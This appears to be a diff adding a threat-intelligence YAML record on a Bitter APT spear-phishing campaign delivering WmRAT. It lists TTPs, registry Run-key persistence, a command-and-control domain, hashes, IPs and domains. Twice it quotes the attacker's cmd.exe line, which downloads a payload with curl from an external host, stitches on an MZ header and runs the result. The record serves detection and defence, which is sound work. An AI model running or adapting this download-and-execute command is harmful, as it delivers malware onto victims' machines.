@@ -1,0 +1,48 @@
+description: "A spear\u2011phishing campaign used an IQY attachment to deliver a WmRAT\
+  \ variant that persisted via the registry Run key and communicated with tradesmarkets.greenadelhouse.com."
+attribution: Bitter APT (TA397), South Asian state-sponsored actor
+malware_families:
+- WmRAT
+TTPs:
+  processes:
+  - cmd.exe
+  - curl.exe
+  - vcswin.exe
+  - gentwin.exe
+  commandline:
+  - '''/c cd C:\\programdata & set /P=\"MZ\"<nul>b1 & curl -o b2 https://fogomyart[.]com/vcswin
+    & copy /b b1+b2 vcswin.exe & start /b vcswin.exe'''
+  powershell: []
+  scripting_engine:
+  - cmd | /c cd C:\\\\programdata & set /P=\\\"MZ\\\"<nul>b1 & curl -o b2 https://fogomyart[.]com/vcswin
+    & copy /b b1+b2 vcswin.exe & start /b vcswin.exe
+  registry_keys:
+  - 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run: C:\\ProgramData\\vcswin.exe'
+  image_load: []
+  network_connections:
+  - process: vcswin.exe
+    destination: tradesmarkets.greenadelhouse.com
+    port: 443
+  file_activity:
+  - C:\\ProgramData\\vcswin.exe
+  - C:\\ProgramData\\gentwin.exe
+  - Downloaded from https://fogomyart[.]com/vcswin.png
+  - Downloaded from https://fogomyart[.]com/random.php
+  persistence:
+  - Registry Run key HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run pointing
+    to C:\\ProgramData\\vcswin.exe
+  process_relations: []
+IOCs:
+  hashes:
+  - 36dbf119cb0cca52aed82ca3e69bbe09d96fa92f2831f8e14dc1bd1b6a5e9590
+  - de6b41ab72bfa4114c79464d1083737c6dfa55767339d732db8d2edd462832ed
+  - edb68223db3e583f9a4dd52fd91867fa3c1ce93a98b3c93df3832318fd0a3a56
+  ips:
+  - 185.244.151.84
+  - 185.244.151.87
+  domains:
+  - tradesmarkets.greenadelhouse.com
+  - fogomyart.com
+reference: https://blog.eclecticiq.com/pakistan-telecommunication-company-ptcl-targeted-by-bitter-apt-during-heightened-regional-conflict
+date_of_publication: May 28, 2025
+file_creation_date: September 16, 2025
